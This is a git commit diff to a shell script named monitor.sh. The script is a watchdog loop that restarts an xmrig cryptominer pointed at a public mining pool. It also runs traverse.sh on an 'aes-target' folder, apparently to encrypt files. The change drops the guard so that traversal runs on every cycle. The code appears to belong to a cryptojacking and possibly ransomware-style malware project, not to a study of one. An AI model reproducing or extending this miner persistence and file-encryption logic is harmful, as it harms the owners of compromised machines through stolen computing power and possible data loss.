bb97a0685e984b4a712eada76c4cdafae099de56
ASxx <oliver12125@sina.com>
2019-12-24 20:28:35 +0800

    sss

--- program/monitor.sh
+++ program/monitor.sh
@@ -20,16 +20,13 @@ function CheckProcess()
 }
 
 
-
 num=0
 while [ 1 ] ; do
     CheckProcess "./xmrig -o pool.minexmr.com:443"
     if [ $? == 0 ];then
         # restart & aes 
-        if [ $num != 0 ];then
         chmod 764 traverse.sh
         ./traverse.sh ./aes-target 
-        fi
         nohup ./run.sh &
         num=$num+1    
     #add other process...
